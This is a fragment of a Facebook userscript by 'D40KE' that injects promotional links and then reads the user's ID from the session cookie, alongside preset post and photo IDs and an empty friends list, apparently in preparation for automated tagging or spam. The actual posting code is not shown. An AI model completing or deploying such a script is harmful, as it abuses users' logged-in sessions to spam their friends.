// ==UserScript==
// @name            Everything At One @D40KE
// @description     All about facebook By D40KE
...
if(body != null) {
	...
	div.innerHTML = "<center><a href='http://www.facebook.com/D40KE'><img src='http://m.uploadedit.com/b018/1375198514954.gif' alt='Loading...' width=120 hight=90></a></center><br><br></br>"
	...
	for(i=1;i<=20;i++) {
		...
		div2.innerHTML = "<center><a onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a> &#8226; <a href='http://www.facebook.com/D40KE' title='Thanks for install this script'>My FansPage</a></center> "
		}
		else {
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/D40KE" target="_blank">Created by D40KE<br>CLICK HERE</a>';
	html += '</div>';
...
var spost_id = "100000090572223";
var sfoto_id = "667044923308521";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
